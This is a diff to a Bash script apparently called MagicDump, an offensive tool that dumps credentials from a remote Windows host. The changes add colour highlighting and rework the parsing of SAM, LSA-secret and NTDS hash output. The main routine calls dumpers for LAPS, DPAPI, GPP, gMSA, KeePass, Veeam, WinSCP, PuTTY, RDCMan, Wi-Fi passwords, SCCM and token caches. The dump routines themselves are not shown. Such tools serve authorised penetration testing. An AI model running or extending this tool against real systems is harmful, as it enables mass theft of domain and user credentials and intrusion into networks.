@@ -63,6 +63,7 @@ RED='\033[0;31m'
 YELLOW='\033[0;33m'
 GREEN='\033[0;32m'
 BLUE='\033[0;34m'
+CREDENTIAL_COLOR='\033[1;35m'  # Bold magenta for credentials
 RESET='\033[0m'
 
 # Dynamic banner
@@ -284,29 +285,44 @@ construct_base_cmd() {
 parse_sam_output() {
   local output_file="$1"
   echo -e "${GREEN}[SAM HASHES FOUND]:${RESET}"
-  grep -oP "^[^:]+:[0-9]+:[^:]+:[^:]+:::" "$output_file" || echo -e "${YELLOW}No SAM hashes found.${RESET}"
+  # Process each line that starts with "SMB"
+  grep "^SMB" "$output_file" | while IFS= read -r line; do
+    # Extract everything except the last field (prefix)
+    prefix=$(echo "$line" | awk '{ 
+      for(i=1;i<NF;i++) printf "%s ", $i; 
+    }')
+    # Extract the last field (credential)
+    credential=$(echo "$line" | awk '{ print $NF }')
+    # Print the prefix normally and the credential in the credential color
+    echo -e "${prefix}${CREDENTIAL_COLOR}${credential}${RESET}"
+  done
 }
 
 parse_lsa_output() {
   local output_file="$1"
   echo -e "${GREEN}[LSA SECRETS FOUND]:${RESET}"
 
-  # Use awk to extract relevant LSA secrets
-  awk '
-    /Dumping LSA secrets/ {secrets = 1; next}
-    secrets && /SMB.*:/ {
-      print "  " $0
+  awk -v cred_color="${CREDENTIAL_COLOR}" -v reset="${RESET}" '
+    /Dumping LSA secrets/ { secrets = 1; next }
+    secrets && (/SMB.*:/ || /dpapi_[a-z]+key:/ || /NL\$KM:/) {
+      # If the line begins with "SMB" and has at least 5 fields,
+      # assume fields 1-4 are fixed and the credential is in field 5 onward.
+      if ($1 == "SMB" && NF >= 5) {
+        prefix = $1 " " $2 " " $3 " " $4 " ";
+        cred = "";
+        for (i = 5; i <= NF; i++) {
+          cred = cred $i " ";
+        }
+        sub(/[[:space:]]+$/, "", cred);  # remove trailing space
+        printf "  %s%s%s\n", prefix, cred_color cred, reset;
+      } else {
+        # Otherwise, color the whole line.
+        printf "  %s%s%s\n", "", cred_color $0, reset;
+      }
     }
-    secrets && /dpapi_[a-z]+key:/ {
-      print "  " $0
-    }
-    secrets && /NL\$KM:/ {
-      print "  " $0
-    }
-    secrets && !/SMB|dpapi|NL\$KM/ {exit}
-  ' "$output_file" | while read -r line; do
-    echo -e "${line}"
-  done || echo -e "${YELLOW}No LSA secrets found.${RESET}"
+    # When a line is encountered that does not match any expected pattern, exit.
+    secrets && !(/SMB|dpapi|NL\$KM/) { exit }
+  ' "$output_file" || echo -e "${YELLOW}No LSA secrets found.${RESET}"
 }
 
 # Dump Functions
@@ -345,17 +361,27 @@ dump_lsa() {
 # Function to parse the NTDS output
 parse_ntds_output() {
   local output_file="$1"
+  echo -e "${GREEN}[NTDS HASHES FOUND]:${RESET}"
 
-  # Extract hashes from the NTDS dump file
-  local hashes
-  hashes=$(grep -oP "^[^:]+:[0-9]+:[^:]+:[^:]+:::" "$output_file")
-
-  if [[ -n "$hashes" ]]; then
-    echo -e "${GREEN}[NTDS HASHES FOUND]:${RESET}"
-    echo "$hashes"
-  else
-    echo -e "${YELLOW}No significant NTDS hashes found in the dump.${RESET}"
-  fi
+  awk -v cred_color="${CREDENTIAL_COLOR}" -v reset="${RESET}" '
+    /^SMB/ {
+      if (NF >= 5) {
+        # Build the prefix from fields 1 to 4 (adjust if needed)
+        prefix = $1 " " $2 " " $3 " " $4 " ";
+        # Build the hash portion from field 5 onward
+        hash = "";
+        for (i = 5; i <= NF; i++) {
+          hash = hash $i " ";
+        }
+        # Remove trailing whitespace from the hash
+        sub(/[[:space:]]+$/, "", hash);
+        # Print the prefix normally and the hash in the credential color, then reset the color.
+        printf("%s%s%s%s\n", prefix, cred_color, hash, reset);
+      } else {
+        print $0;
+      }
+    }
+  ' "$output_file"
 }
 
 # Function to execute NTDS dump using drsuapi
@@ -450,7 +476,7 @@ parse_dpapi_output() {
 
         # Ensure uniqueness
         if [[ -n "$full_credential" && -z "${unique_secrets[$full_credential]}" ]]; then
-          echo $full_credential
+          echo -e "${CREDENTIAL_COLOR}$full_credential${RESET}"
           unique_secrets["$full_credential"]=1
           secrets_found=1
         fi
@@ -793,22 +819,84 @@ dump_token_cache() {
 # Main Logic
 add_log "Starting MagicDump against target $TARGET_HOST"
 add_log "Authenticating as user '$USERNAME'..."
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_sam
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_lsa
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_ntds
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_laps
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_dpapi
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_gpp
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_gmsa
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_keepass
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_veeam
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_winscp
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
 dump_putty
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+
 #dump_vnc
 #dump_mremoteng
-dump_rdcman
-dump_wifi_passwords
-dump_sccm
-dump_token_cache
 
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+dump_rdcman
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+dump_wifi_passwords
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+dump_sccm
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+dump_token_cache
+echo -e "\e[1;32m----------------------------------------------------------------------------------------------------------------------\e[0m"
+
+echo -e "\n"
 echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
